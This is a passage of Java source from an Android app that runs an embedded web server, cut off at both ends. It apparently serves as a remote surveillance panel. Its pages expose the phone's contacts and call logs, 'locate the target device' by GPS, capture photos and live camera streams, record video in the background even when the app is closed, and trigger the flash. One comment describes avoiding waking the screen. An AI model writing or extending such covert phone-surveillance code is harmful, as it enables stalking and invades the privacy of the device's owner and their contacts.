                    html.append("<button type=\"submit\" class=\"btn btn-small\">GO</button>");
                    html.append("</form>");

                    html.append("</div>");
                }
            } else {
                html.append(
                        "<div class=\"empty-state\"><div class=\"icon\">&#128222;</div><p>No call logs found</p></div>");
            }
        } catch (SecurityException e) {
            html.append("<div class=\"empty-state\"><div class=\"icon\">&#128274;</div>");
            html.append("<p>Permission denied.</p>");
            html.append("<p style=\"margin-top: 10px; font-size: 0.9rem;\">Error: ").append(escapeHtml(e.getMessage()))
                    .append("</p>");
            html.append("</div>");
        } catch (Exception e) {
            html.append("<div class=\"empty-state\"><div class=\"icon\">&#9888;</div>");
            html.append("<p>Error loading call logs</p>");
            html.append("<p style=\"margin-top: 10px; font-size: 0.9rem;\">").append(escapeHtml(e.getMessage()))
                    .append("</p>");
            html.append("</div>");
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }

        html.append("</div>");
        html.append(HTML_FOOTER);

        return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
    }

    private Response serveContacts(Map<String, String> params) {
        StringBuilder html = new StringBuilder(HTML_HEADER);
        html.append("<div class=\"card\">");
        html.append("<h2 style=\"margin-bottom: 20px;\">Contacts</h2>");

        // Check permission first
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (context.checkSelfPermission(Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
                html.append("<div class=\"empty-state\"><div class=\"icon\">&#128274;</div>");
                html.append("<p>Contacts permission not granted.</p>");
                html.append(
                        "<p style=\"margin-top: 10px; font-size: 0.9rem;\">Please grant the permission in the app settings.</p>");
                html.append("</div>");
                html.append("</div>");
                html.append(HTML_FOOTER);
                return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
            }
        }

        // Pagination
        int page = 1;
        int limit = 50;
        try {
            if (params.containsKey("page")) {
                page = Integer.parseInt(params.get("page"));
                if (page < 1)
                    page = 1;
            }
        } catch (Exception e) {
            page = 1;
        }
        int offset = (page - 1) * limit;

        Cursor cursor = null;
        try {
            cursor = context.getContentResolver().query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    new String[] {
                            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                            ContactsContract.CommonDataKinds.Phone.NUMBER
                    },
                    null, null,
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC");

            if (cursor != null && cursor.getCount() > 0) {
                int totalCount = cursor.getCount();
                int totalPages = (int) Math.ceil((double) totalCount / limit);

                html.append("<p style=\"color: #888; margin-bottom: 15px;\">Total: ").append(totalCount)
                        .append(" contacts | Page ").append(page).append(" of ").append(totalPages).append("</p>");

                html.append("<div style=\"overflow-x: auto;\">");
                html.append("<table>");
                html.append("<thead><tr>");
                html.append("<th>Name</th><th>Phone Number</th>");
                html.append("</tr></thead><tbody>");

                int count = 0;
                int skipped = 0;

                while (cursor.moveToNext()) {
                    if (skipped < offset) {
                        skipped++;
                        continue;
                    }

                    if (count >= limit)
                        break;

                    String name = cursor.getString(0);
                    String number = cursor.getString(1);
                    String initial = name != null && !name.isEmpty() ? name.substring(0, 1).toUpperCase() : "?";

                    html.append("<tr>");
                    html.append("<td style=\"display: flex; align-items: center;\">");
                    html.append("<div class=\"contact-avatar\">").append(initial).append("</div>");
                    html.append("<span>").append(name != null ? escapeHtml(name) : "Unknown").append("</span>");
                    html.append("</td>");
                    html.append("<td>").append(number != null ? escapeHtml(number) : "N/A").append("</td>");
                    html.append("</tr>");

                    count++;
                }

                html.append("</tbody></table>");
                html.append("</div>");

                // Pagination links
                if (totalPages > 1) {
                    html.append("<div class=\"pagination\" style=\"flex-direction: column; gap: 15px;\">");

                    html.append("<div style=\"display: flex; gap: 5px; justify-content: center; flex-wrap: wrap;\">");
                    if (page > 1) {
                        html.append("<a href=\"/contacts?page=1\">First</a>");
                        html.append("<a href=\"/contacts?page=").append(page - 1).append("\">&#8592; Prev</a>");
                    }

                    int startPage = Math.max(1, page - 2);
                    int endPage = Math.min(totalPages, page + 2);

                    for (int i = startPage; i <= endPage; i++) {
                        String active = (i == page) ? "class=\"active\"" : "";
                        html.append("<a ").append(active).append(" href=\"/contacts?page=").append(i).append("\">").append(i).append("</a>");
                    }

                    if (page < totalPages) {
                        html.append("<a href=\"/contacts?page=").append(page + 1).append("\">Next &#8594;</a>");
                        html.append("<a href=\"/contacts?page=").append(totalPages).append("\">Last</a>");
                    }
                    html.append("</div>");

                    // Jump to page box
                    html.append("<form action=\"/contacts\" method=\"get\" style=\"display: flex; gap: 10px; justify-content: center; align-items: center;\">");
                    html.append("<span style=\"font-size: 0.8rem; color: #888;\">Jump to:</span>");
                    html.append("<input type=\"number\" name=\"page\" min=\"1\" max=\"").append(totalPages).append("\" value=\"").append(page).append("\" style=\"width: 60px; background: rgba(0,0,0,0.5); border: 1px solid var(--neon-cyan); color: white; padding: 5px; border-radius: 4px; text-align: center;\">");
                    html.append("<button type=\"submit\" class=\"btn btn-small\">GO</button>");
                    html.append("</form>");

                    html.append("</div>");
                }
            } else {
                html.append(
                        "<div class=\"empty-state\"><div class=\"icon\">&#128101;</div><p>No contacts found</p></div>");
            }
        } catch (SecurityException e) {
            html.append("<div class=\"empty-state\"><div class=\"icon\">&#128274;</div>");
            html.append("<p>Permission denied.</p>");
            html.append("<p style=\"margin-top: 10px; font-size: 0.9rem;\">Error: ").append(escapeHtml(e.getMessage()))
                    .append("</p>");
            html.append("</div>");
        } catch (Exception e) {
            html.append("<div class=\"empty-state\"><div class=\"icon\">&#9888;</div>");
            html.append("<p>Error loading contacts</p>");
            html.append("<p style=\"margin-top: 10px; font-size: 0.9rem;\">").append(escapeHtml(e.getMessage()))
                    .append("</p>");
            html.append("</div>");
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }

        html.append("</div>");
        html.append(HTML_FOOTER);

        return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
    }

    private Response serve404() {
        String html = HTML_HEADER +
                "<div class=\"card\">" +
                "<div class=\"empty-state\">" +
                "<div class=\"icon\">&#128269;</div>" +
                "<h2 style=\"margin-bottom: 10px;\">Page Not Found</h2>" +
                "<p>The requested page does not exist.</p>" +
                "<a href=\"/\" style=\"display: inline-block; margin-top: 20px; padding: 12px 24px; background: linear-gradient(135deg, #e94560, #ff6b6b); border-radius: 10px; color: white; text-decoration: none;\">Go Home</a>"
                +
                "</div>" +
                "</div>" +
                HTML_FOOTER;
        return newFixedLengthResponse(Response.Status.NOT_FOUND, "text/html", html);
    }

    private Response serveError(String message) {
        String html = HTML_HEADER +
                "<div class=\"card\">" +
                "<div class=\"empty-state\">" +
                "<div class=\"icon\">&#9888;</div>" +
                "<h2 style=\"margin-bottom: 10px;\">Error</h2>" +
                "<p>" + escapeHtml(message) + "</p>" +
                "</div>" +
                "</div>" +
                HTML_FOOTER;
        return newFixedLengthResponse(Response.Status.INTERNAL_ERROR, "text/html", html);
    }

    private Response triggerFlash() {
        try {
            // Check if CameraService is using the camera
            if (CameraService.isCurrentlyStreaming() || CameraService.isCurrentlyRecording()) {
                return serveError("Flash unavailable while camera is in use (streaming/recording).");
            }

            CameraManager camManager = (CameraManager) context.getSystemService(Context.CAMERA_SERVICE);
            String backCameraId = null;
            
            for (String id : camManager.getCameraIdList()) {
                try {
                    android.hardware.camera2.CameraCharacteristics characteristics = camManager.getCameraCharacteristics(id);
                    Integer facing = characteristics.get(android.hardware.camera2.CameraCharacteristics.LENS_FACING);
                    if (facing != null && facing == android.hardware.camera2.CameraCharacteristics.LENS_FACING_BACK) {
                        backCameraId = id;
                        break;
                    }
                } catch (Exception e) {
                    Log.e("K4N3CO", "Error checking camera " + id, e);
                }
            }

            if (backCameraId == null && camManager.getCameraIdList().length > 0) {
                backCameraId = camManager.getCameraIdList()[0];
            }

            if (backCameraId != null) {
                final String finalId = backCameraId;
                new Thread(() -> {
                    try {
                        // Use ApplicationContext to avoid triggering UI updates that might wake screen
                        Context appContext = context.getApplicationContext();
                        CameraManager manager = (CameraManager) appContext.getSystemService(Context.CAMERA_SERVICE);
                        
                        for (int i = 0; i < 3; i++) {
                            try {
                                manager.setTorchMode(finalId, true);
                                Thread.sleep(300);
                                manager.setTorchMode(finalId, false);
                                Thread.sleep(300);
                            } catch (android.hardware.camera2.CameraAccessException e) {
                                // If camera is in use (e.g. streaming), torch mode might fail
                                Log.e("K4N3CO", "Flash access error: " + e.getMessage());
                                break;
                            }
                        }
                    } catch (Exception e) {
                        Log.e("K4N3CO", "Flash error: " + e.getMessage());
                    }
                }).start();
                return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true, \"message\": \"Flash command dispatched\"}");
            } else {
                return serveError("No camera with flash found.");
            }
        } catch (Exception e) {
            return serveError("Flash error: " + e.getMessage());
        }
    }

    private Response serveGpsPage() {
        StringBuilder html = new StringBuilder(HTML_HEADER);
        html.append("<div class=\"card\">");
        html.append("<h2 style=\"margin-bottom: 20px;\">&#128205; GPS Tracker</h2>");
        html.append("<p style=\"color: #888; margin-bottom: 25px;\">Locate the target device using global satellite positioning.</p>");
        
        html.append("<div style=\"text-align: center;\">");
        html.append("<a href=\"/gps/locate\" class=\"btn\" style=\"padding: 20px 40px; font-size: 1.2rem;\">&#128205; INITIALIZE TRACKING</a>");
        html.append("</div>");
        
        html.append("<div style=\"margin-top: 30px; padding: 20px; background: rgba(0,0,0,0.3); border: 1px solid rgba(0, 242, 255, 0.1);\">");
        html.append("<h3 style=\"font-size: 0.8rem; opacity: 0.7;\">TRACKING_LOG</h3>");
        html.append("<div style=\"color: var(--terminal-green); font-size: 0.75rem; font-family: 'JetBrains Mono', monospace;\">");
        html.append("<div>[WAITING] Awaiting command...</div>");
        html.append("</div></div>");
        
        html.append("</div>");
        html.append(HTML_FOOTER);
        return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
    }

    private Response serveGpsLocate() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (context.checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
                return serveError("Location permission not granted.");
            }
        }

        try {
            LocationManager locationManager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
            Location location = null;
            
            if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            }
            
            if (location == null && locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
                location = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            }

            if (location != null) {
                double lat = location.getLatitude();
                double lon = location.getLongitude();
                String mapsUrl = "https://www.google.com/maps/search/?api=1&query=" + lat + "," + lon;
                
                // Redirect to Google Maps
                Response response = newFixedLengthResponse(Response.Status.REDIRECT, "text/html", "");
                response.addHeader("Location", mapsUrl);
                return response;
            } else {
                return serveError("Could not retrieve location. Ensure GPS is enabled on the device.");
            }
        } catch (SecurityException e) {
            return serveError("Location permission denied: " + e.getMessage());
        } catch (Exception e) {
            return serveError("Location error: " + e.getMessage());
        }
    }

    private String escapeHtml(String text) {
        if (text == null)
            return "";
        return text.replace("&", "&amp;")
                .replace("<", "&lt;")
                .replace(">", "&gt;")
                .replace("\"", "&quot;")
                .replace("'", "&#39;");
    }

    private String getFileIcon(File file) {
        if (file.isDirectory())
            return "&#128193;";
        String name = file.getName().toLowerCase();
        if (name.matches(".*\\.(jpg|jpeg|png|gif|bmp|webp)$"))
            return "&#128444;";
        if (name.matches(".*\\.(mp4|mkv|avi|mov|wmv|flv|webm)$"))
            return "&#127916;";
        if (name.matches(".*\\.(mp3|wav|aac|flac|ogg|m4a)$"))
            return "&#127925;";
        if (name.matches(".*\\.(pdf)$"))
            return "&#128196;";
        if (name.matches(".*\\.(doc|docx|txt|rtf)$"))
            return "&#128221;";
        if (name.matches(".*\\.(xls|xlsx|csv)$"))
            return "&#128202;";
        if (name.matches(".*\\.(zip|rar|7z|tar|gz)$"))
            return "&#128230;";
        if (name.matches(".*\\.(apk)$"))
            return "&#128241;";
        return "&#128196;";
    }

    private String getFileIconClass(File file) {
        if (file.isDirectory())
            return "folder-icon";
        String name = file.getName().toLowerCase();
        if (name.matches(".*\\.(jpg|jpeg|png|gif|bmp|webp)$"))
            return "file-icon-image";
        if (name.matches(".*\\.(mp4|mkv|avi|mov|wmv|flv|webm)$"))
            return "file-icon-video";
        if (name.matches(".*\\.(mp3|wav|aac|flac|ogg|m4a)$"))
            return "file-icon-audio";
        if (name.matches(".*\\.(pdf|doc|docx|txt|rtf|xls|xlsx|csv)$"))
            return "file-icon-doc";
        return "file-icon-default";
    }

    private String getMimeType(String filename) {
        String name = filename.toLowerCase();
        if (name.endsWith(".jpg") || name.endsWith(".jpeg"))
            return "image/jpeg";
        if (name.endsWith(".png"))
            return "image/png";
        if (name.endsWith(".gif"))
            return "image/gif";
        if (name.endsWith(".mp4"))
            return "video/mp4";
        if (name.endsWith(".mp3"))
            return "audio/mpeg";
        if (name.endsWith(".pdf"))
            return "application/pdf";
        if (name.endsWith(".zip"))
            return "application/zip";
        if (name.endsWith(".apk"))
            return "application/vnd.android.package-archive";
        return "application/octet-stream";
    }

    private String formatFileSize(long size) {
        if (size < 1024)
            return size + " B";
        if (size < 1024 * 1024)
            return String.format("%.1f KB", size / 1024.0);
        if (size < 1024 * 1024 * 1024)
            return String.format("%.1f MB", size / (1024.0 * 1024));
        return String.format("%.1f GB", size / (1024.0 * 1024 * 1024));
    }

    private String formatDuration(int seconds) {
        if (seconds < 60)
            return seconds + "s";
        if (seconds < 3600)
            return String.format("%dm %ds", seconds / 60, seconds % 60);
        return String.format("%dh %dm", seconds / 3600, (seconds % 3600) / 60);
    }

    // ============ Camera Methods ============

    private Response serveCameraPage() {
        StringBuilder html = new StringBuilder(HTML_HEADER);
        html.append("<div class=\"card\">");
        html.append("<h2 style=\"margin-bottom: 20px;\">&#128247; Camera</h2>");

        // Check permission
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (context.checkSelfPermission(android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                html.append("<div class=\"empty-state\"><div class=\"icon\">&#128274;</div>");
                html.append("<p>Camera permission not granted.</p>");
                html.append(
                        "<p style=\"margin-top: 10px; font-size: 0.9rem;\">Please grant camera permission in the app settings.</p>");
                html.append("</div>");
                html.append("</div>");
                html.append(HTML_FOOTER);
                return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
            }
        }

        // List available cameras using CameraHelper
        CameraHelper cameraHelper = new CameraHelper(context);
        java.util.List<CameraHelper.CameraInfo> cameras = cameraHelper.getAvailableCameras();

        if (cameras.isEmpty()) {
            html.append("<div class=\"empty-state\"><div class=\"icon\">&#128247;</div>");
            html.append("<p>No cameras available</p>");
            html.append("</div>");
        } else {
            // Photo Capture Section
            html.append("<div class=\"info-section\">");
            html.append("<h3 style=\"color: #3498db; margin-bottom: 15px;\">&#128247; Photo Capture</h3>");
            html.append(
                    "<p style=\"color: #888; font-size: 0.9rem; margin-bottom: 15px;\">Tap to capture a photo from the selected camera</p>");
            html.append(
                    "<div style=\"display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 15px;\">");

            for (CameraHelper.CameraInfo cam : cameras) {
                String icon = cam.facing.equals("Front") ? "&#129333;" : "&#128247;";
                String bgColor = cam.facing.equals("Front") ? "rgba(155, 89, 182, 0.2)" : "rgba(52, 152, 219, 0.2)";
                String borderColor = cam.facing.equals("Front") ? "rgba(155, 89, 182, 0.3)" : "rgba(52, 152, 219, 0.3)";
                String textColor = cam.facing.equals("Front") ? "#9b59b6" : "#3498db";

                html.append("<a href=\"/camera/capture?cam=").append(cam.id).append("\" ");
                html.append("style=\"padding: 25px 20px; background: ").append(bgColor).append("; ");
                html.append("border-radius: 15px; text-decoration: none; text-align: center; ");
                html.append("border: 1px solid ").append(borderColor).append("; display: block;\">");
                html.append("<div style=\"font-size: 2.5rem; margin-bottom: 10px;\">").append(icon).append("</div>");
                html.append("<div style=\"color: ").append(textColor).append("; font-weight: 600;\">")
                        .append(cam.facing).append(" Camera</div>");
                html.append("<div style=\"color: #888; font-size: 0.8rem; margin-top: 5px;\">")
                        .append(cam.width).append(" x ").append(cam.height).append("</div>");
                html.append("</a>");
            }
            html.append("</div>");
            html.append("</div>");

            // Live Streaming Section
            html.append("<div class=\"info-section\" style=\"margin-top: 15px;\">");
            html.append("<h3 style=\"color: #e74c3c; margin-bottom: 15px;\">&#128249; Live Streaming</h3>");
            html.append(
                    "<p style=\"color: #888; font-size: 0.9rem; margin-bottom: 15px;\">View live camera feed in your browser</p>");
            html.append(
                    "<div style=\"display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 15px;\">");

            for (CameraHelper.CameraInfo cam : cameras) {
                String icon = cam.facing.equals("Front") ? "&#129333;" : "&#128249;";
                html.append("<a href=\"/camera/live?cam=").append(cam.id).append("\" ");
                html.append("style=\"padding: 25px 20px; background: rgba(231, 76, 60, 0.2); ");
                html.append("border-radius: 15px; text-decoration: none; text-align: center; ");
                html.append("border: 1px solid rgba(231, 76, 60, 0.3); display: block;\">");
                html.append("<div style=\"font-size: 2.5rem; margin-bottom: 10px;\">").append(icon).append("</div>");
                html.append("<div style=\"color: #e74c3c; font-weight: 600;\">Live ").append(cam.facing)
                        .append("</div>");
                html.append("<div style=\"color: #888; font-size: 0.8rem; margin-top: 5px;\">Click for stream</div>");
                html.append("</a>");
            }
            html.append("</div>");
            html.append("</div>");

            // Video Recording Section
            html.append("<div class=\"info-section\" style=\"margin-top: 15px;\">");
            html.append("<h3 style=\"color: #27ae60; margin-bottom: 15px;\">&#127909; Background Video Recording</h3>");
            html.append(
                    "<p style=\"color: #888; font-size: 0.9rem; margin-bottom: 15px;\">Record video in background - works even when app is closed</p>");
            html.append(
                    "<div id=\"rec-status\" style=\"text-align: center; margin-bottom: 15px; color: #888;\">Checking status...</div>");
            html.append("<div style=\"display: flex; gap: 10px; justify-content: center; flex-wrap: wrap;\">");

            for (CameraHelper.CameraInfo cam : cameras) {
                html.append("<button onclick=\"startRecording('").append(cam.id).append("')\" ");
                html.append("style=\"padding: 15px 25px; background: linear-gradient(135deg, #27ae60, #2ecc71); ");
                html.append("border: none; border-radius: 10px; color: #fff; font-weight: 600; cursor: pointer;\">");
                html.append("&#127909; Record ").append(cam.facing);
                html.append("</button>");
            }

            html.append("<button onclick=\"stopRecording()\" ");
            html.append("style=\"padding: 15px 25px; background: linear-gradient(135deg, #e74c3c, #c0392b); ");
            html.append("border: none; border-radius: 10px; color: #fff; font-weight: 600; cursor: pointer;\">");
            html.append("&#9632; Stop Recording");
            html.append("</button>");
            html.append("</div>");

            // JavaScript for recording
            html.append("<script>");
            html.append("function startRecording(camId) {");
            html.append("  fetch('/camera/record?cam=' + camId).then(r => r.json()).then(d => {");
            html.append(
                    "    document.getElementById('rec-status').innerHTML = '<span style=\"color: #e74c3c;\">&#9679;&nbsp;Recording from camera ' + camId + '...</span>';");
            html.append("  });");
            html.append("}");
            html.append("function stopRecording() {");
            html.append("  fetch('/camera/stop-record').then(r => r.json()).then(d => {");
            html.append(
                    "    document.getElementById('rec-status').innerHTML = '<span style=\"color: #27ae60;\">Recording stopped. ' + (d.path || '') + '</span>';");
            html.append("  });");
            html.append("}");
            html.append("function checkRecStatus() {");
            html.append("  fetch('/camera/status').then(r => r.json()).then(d => {");
            html.append("    if (d.recording) {");
            html.append(
                    "      document.getElementById('rec-status').innerHTML = '<span style=\"color: #e74c3c;\">&#9679;&nbsp;Recording in progress (' + d.duration + 's)</span>';");
            html.append("    } else {");
            html.append(
                    "      document.getElementById('rec-status').innerHTML = '<span style=\"color: #888;\">Not recording</span>';");
            html.append("    }");
            html.append("  });");
            html.append("}");
            html.append("checkRecStatus();");
            html.append("setInterval(checkRecStatus, 2000);");
            html.append("</script>");

            html.append("</div>");
        }

        html.append("</div>");
        html.append(HTML_FOOTER);

        return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
    }

    private Response serveCameraCapture(Map<String, String> params) {
        String cameraId = params.get("cam");
        if (cameraId == null || cameraId.isEmpty()) {
            cameraId = "0"; // Default to back camera
        }

        StringBuilder html = new StringBuilder(HTML_HEADER);
        html.append("<div class=\"card\">");
        html.append("<h2 style=\"margin-bottom: 20px;\">&#128247; Capturing Photo...</h2>");

        // Check permission
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (context.checkSelfPermission(android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                html.append("<div class=\"empty-state\"><div class=\"icon\">&#128274;</div>");
                html.append("<p>Camera permission not granted.</p>");
                html.append("</div>");
                html.append("</div>");
                html.append(HTML_FOOTER);
                return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
            }
        }

        try {
            CameraHelper cameraHelper = new CameraHelper(context);
            byte[] imageData = cameraHelper.capturePhoto(cameraId);

            if (imageData != null && imageData.length > 0) {
                String base64Image = android.util.Base64.encodeToString(imageData, android.util.Base64.NO_WRAP);

                html.append("<div style=\"text-align: center;\">");
                html.append("<img src=\"data:image/jpeg;base64,").append(base64Image).append("\" ");
                html.append("style=\"max-width: 100%; height: auto; border-radius: 10px; margin-bottom: 20px;\" />");
                html.append("</div>");

                html.append("<div style=\"display: flex; gap: 10px; justify-content: center; flex-wrap: wrap;\">");
                html.append(
                        "<a href=\"/camera\" style=\"padding: 12px 24px; background: rgba(52, 152, 219, 0.2); border-radius: 10px; color: #3498db; text-decoration: none;\">&#8592; Back to Camera</a>");
                html.append("<a href=\"/camera/photo?cam=").append(cameraId).append(
                        "\" style=\"padding: 12px 24px; background: rgba(46, 204, 113, 0.2); border-radius: 10px; color: #2ecc71; text-decoration: none;\">&#8595; Download Photo</a>");
                html.append("<a href=\"/camera/capture?cam=").append(cameraId).append(
                        "\" style=\"padding: 12px 24px; background: rgba(233, 69, 96, 0.2); border-radius: 10px; color: #e94560; text-decoration: none;\">&#128247; Capture Again</a>");
                html.append("</div>");

            } else {
                String error = cameraHelper.getLastError();
                html.append("<div class=\"empty-state\"><div class=\"icon\">&#9888;</div>");
                html.append("<p>Failed to capture photo</p>");
                if (error != null) {
                    html.append("<p style=\"color: #e74c3c; font-size: 0.9rem; margin-top: 10px;\">")
                            .append(escapeHtml(error)).append("</p>");
                }
                html.append(
                        "<a href=\"/camera\" style=\"display: inline-block; margin-top: 20px; padding: 12px 24px; background: rgba(52, 152, 219, 0.2); border-radius: 10px; color: #3498db; text-decoration: none;\">&#8592; Back to Camera</a>");
                html.append("</div>");
            }

        } catch (Exception e) {
            html.append("<div class=\"empty-state\"><div class=\"icon\">&#9888;</div>");
            html.append("<p>Error: ").append(escapeHtml(e.getMessage())).append("</p>");
            html.append(
                    "<a href=\"/camera\" style=\"display: inline-block; margin-top: 20px; padding: 12px 24px; background: rgba(52, 152, 219, 0.2); border-radius: 10px; color: #3498db; text-decoration: none;\">&#8592; Back to Camera</a>");
            html.append("</div>");
        }

        html.append("</div>");
        html.append(HTML_FOOTER);

        return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
    }

    private Response serveCameraPhoto(Map<String, String> params) {
        String cameraId = params.get("cam");
        if (cameraId == null || cameraId.isEmpty()) {
            cameraId = "0";
        }

        // Check permission
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (context.checkSelfPermission(android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                return serveError("Camera permission not granted");
            }
        }

        try {
            CameraHelper cameraHelper = new CameraHelper(context);
            byte[] imageData = cameraHelper.capturePhoto(cameraId);

            if (imageData != null && imageData.length > 0) {
                java.io.ByteArrayInputStream bis = new java.io.ByteArrayInputStream(imageData);
                Response response = newFixedLengthResponse(Response.Status.OK, "image/jpeg", bis, imageData.length);
                response.addHeader("Content-Disposition",
                        "attachment; filename=\"photo_" + cameraId + "_" + System.currentTimeMillis() + ".jpg\"");
                return response;
            } else {
                String error = cameraHelper.getLastError();
                return serveError(error != null ? error : "Failed to capture photo");
            }

        } catch (Exception e) {
            return serveError("Error capturing photo: " + e.getMessage());
        }
    }

    // ============ LIVE STREAMING ============

    private Response serveLiveStreamPage(Map<String, String> params) {
        String camId = params.get("cam");
        if (camId == null)
            camId = "0";

        // Get resolution from params, default to "low" for mobile data optimization
        String res = params.get("res");
        if (res == null)
            res = "low";

        // Resolution presets optimized for different network speeds
        int width, height, quality, fps;
        String resLabel;
        switch (res) {
            case "ultra_low":
                width = 160;
                height = 120;
                quality = 20;
                fps = 2;
                resLabel = "Ultra Low (160x120)";
                break;
            case "very_low":
                width = 240;
                height = 180;
                quality = 25;
                fps = 3;
                resLabel = "Very Low (240x180)";
                break;
            case "low":
            default:
                width = 320;
                height = 240;
                quality = 30;
                fps = 5;
                resLabel = "Low (320x240) - DEFAULT";
                break;
            case "medium":
                width = 480;
                height = 360;
                quality = 40;
                fps = 8;
                resLabel = "Medium (480x360)";
                break;
            case "high":
                width = 640;
                height = 480;
                quality = 50;
                fps = 10;
                resLabel = "High (640x480)";
                break;
            case "very_high":
                width = 800;
                height = 600;
                quality = 60;
                fps = 12;
                resLabel = "Very High (800x600)";
                break;
            case "hd":
                width = 1280;
                height = 720;
                quality = 70;
                fps = 15;
                resLabel = "HD (1280x720)";
                break;
        }

        int refreshRate = 1000 / fps; // Convert FPS to milliseconds

        StringBuilder html = new StringBuilder(HTML_HEADER);
        html.append("<div class=\"card\">");
        html.append("<h2 style=\"margin-bottom: 20px;\">&#128249; Live Camera Stream</h2>");

        // Check permission
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (context.checkSelfPermission(android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                html.append("<div class=\"empty-state\"><div class=\"icon\">&#128274;</div>");
                html.append("<p>Camera permission not granted.</p>");
                html.append("</div>");
                html.append("</div>");
                html.append(HTML_FOOTER);
                return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
            }
        }

        // Network info banner
        html.append(
                "<div style=\"background: rgba(52, 152, 219, 0.2); padding: 10px 15px; border-radius: 8px; margin-bottom: 15px; text-align: center;\">");
        html.append("<span style=\"color: #3498db; font-size: 0.85rem;\">&#128246; Current: ").append(resLabel);
        html.append(" | ~").append(quality * width * height / 8000).append(" KB/frame</span>");
        html.append("</div>");

        // Live stream viewer
        html.append("<div style=\"text-align: center; margin-bottom: 20px;\">");
        html.append(
                "<div id=\"stream-container\" style=\"position: relative; display: inline-block; background: #000; border-radius: 10px; overflow: hidden; min-height: 180px;\">");
        html.append(
                "<img id=\"stream\" src=\"/camera/frame\" style=\"max-width: 100%; height: auto; display: block; transition: transform 0.3s ease;\" ");
        html.append("onerror=\"handleStreamError()\" onload=\"streamLoaded()\" />");
        html.append(
                "<div id=\"stream-overlay\" style=\"position: absolute; top: 10px; left: 10px; background: rgba(0,0,0,0.7); padding: 5px 10px; border-radius: 5px; font-size: 0.8rem;\">");
        html.append("<span id=\"stream-status\" style=\"color: #2ecc71;\">&#9679; LIVE</span>");
        html.append("<span id=\"fps-counter\" style=\"color: #888; margin-left: 10px;\"></span>");
        html.append("</div>");
        html.append(
                "<div id=\"loading\" style=\"position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); color: #fff;\">Loading...</div>");
        html.append(
                "<div id=\"rec-indicator\" style=\"position: absolute; top: 10px; right: 10px; background: rgba(231, 76, 60, 0.9); padding: 5px 10px; border-radius: 5px; font-size: 0.8rem; display: none;\">");
        html.append("<span style=\"color: #fff;\">&#9679; REC</span>");
        html.append("</div>");
        html.append("</div>");
        html.append("</div>");

        // Resolution selector
        html.append("<div style=\"margin-bottom: 20px; text-align: center;\">");
        html.append(
                "<h4 style=\"color: #888; margin-bottom: 10px; font-size: 0.9rem;\">&#128246; Resolution (for slow internet, choose lower)</h4>");
        html.append("<div style=\"display: flex; gap: 8px; justify-content: center; flex-wrap: wrap;\">");

        String[] resOptions = { "ultra_low", "very_low", "low", "medium", "high", "very_high", "hd" };
        String[] resNames = { "Ultra Low", "Very Low", "Low", "Medium", "High", "Very High", "HD" };
        for (int i = 0; i < resOptions.length; i++) {
            String selected = resOptions[i].equals(res) ? "background: #e94560; color: #fff;"
                    : "background: rgba(255,255,255,0.1);";
            html.append("<a href=\"/camera/live?cam=").append(camId).append("&res=").append(resOptions[i])
                    .append("\" ");
            html.append("style=\"padding: 8px 12px; ").append(selected)
                    .append(" border-radius: 6px; color: #fff; text-decoration: none; font-size: 0.8rem;\">");
            html.append(resNames[i]);
            html.append("</a>");
        }
        html.append("</div>");
        html.append("</div>");

        // Camera selection
        html.append(
                "<div style=\"display: flex; gap: 10px; justify-content: center; flex-wrap: wrap; margin-bottom: 20px;\">");
        CameraHelper cameraHelper = new CameraHelper(context);
        java.util.List<CameraHelper.CameraInfo> cameras = cameraHelper.getAvailableCameras();
        for (CameraHelper.CameraInfo cam : cameras) {
            String selected = cam.id.equals(camId) ? "background: #e94560; color: #fff;" : "";
            html.append("<a href=\"/camera/live?cam=").append(cam.id).append("&res=").append(res).append("\" ");
            html.append(
                    "style=\"padding: 10px 20px; background: rgba(255,255,255,0.1); border-radius: 8px; color: #fff; text-decoration: none; ")
                    .append(selected).append("\">");
            html.append(cam.facing).append(" Camera");
            html.append("</a>");
        }
        html.append("</div>");

        // Action buttons
        html.append("<div style=\"display: flex; gap: 10px; justify-content: center; flex-wrap: wrap;\">");
        html.append(
                "<button onclick=\"triggerFlash()\" style=\"padding: 12px 24px; background: rgba(255, 255, 0, 0.2); border: 1px solid #ffff00; border-radius: 10px; color: #ffff00; font-weight: 600; cursor: pointer;\">&#9889; Blink Flash</button>");
        html.append(
